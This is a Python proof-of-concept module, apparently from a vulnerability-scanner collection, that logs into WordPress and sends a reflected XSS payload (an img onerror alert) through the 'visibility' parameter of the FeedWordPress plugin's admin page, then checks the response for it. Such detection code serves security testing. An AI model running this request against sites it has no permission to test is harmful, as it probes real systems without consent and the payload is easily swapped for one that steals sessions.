import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''FeedWordPress < 2022.0123 - Reflected Cross-Site Scripting (XSS)''',
        "description": '''The plugin is affected by a Reflected Cross-Site Scripting (XSS) within the "visibility" parameter.''',
        "severity": "medium",
        "references": [
            "https://wpscan.com/vulnerability/7ed050a4-27eb-4ecb-9182-1d8fa1e71571"
        ],
        "classification": {
            "cvss-metrics": "",
            "cvss-score": "",
            "cve-id": "",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["wordpress", "wp-plugin", "xss", "feedwordpress", "authenticated"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        s = requests.Session()

        path = """/wp-login.php"""
        method = "POST"
        data = """log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1"""
        headers = {'Content-Type': 'application/x-www-form-urlencoded', 'Cookie': 'wordpress_test_cookie=WP%20Cookie%20check'}
        resp0 = s.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        path = """/wp-admin/admin.php?page=feedwordpress%2Fsyndication.php&visibility=%22%3E%3Cimg+src%3D2+onerror%3Dalert%28document.domain%29%3E"""
        method = "GET"
        data = """"""
        headers = {}
        resp1 = s.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if ("""><img src=2 onerror=alert(document.domain)>" method="post">""" in resp1.text) and ("""text/html""" in str(resp1.headers)) and (resp1.status_code == 200):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url